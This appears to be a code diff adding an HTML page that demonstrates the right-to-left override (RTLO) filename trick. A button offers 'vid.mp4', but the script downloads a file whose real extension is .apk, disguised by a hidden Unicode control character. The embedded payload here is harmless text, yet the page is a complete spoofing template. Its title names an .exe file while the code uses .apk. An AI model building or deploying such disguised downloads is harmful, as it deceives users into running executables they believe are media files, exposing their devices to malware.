@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><title>RTLO Trick - vid.exe disguised as mp4</title></head>
+<body>
+<h2>Download File: Disguised as Video</h2>
+<button onclick="download()">Download 'vid.mp4'</button>
+
+<script>
+function download() {
+    const name = "vid\u202e4pm.apk";
+    const dataURI = "data:application/octet-stream;base64,UGVhY2UgQmUgVXBvbiBZb3U=";
+    const a = document.createElement("a");
+    a.href = dataURI;
+    a.download = name;
+    a.click();
+}
+</script>
+</body>
+</html>
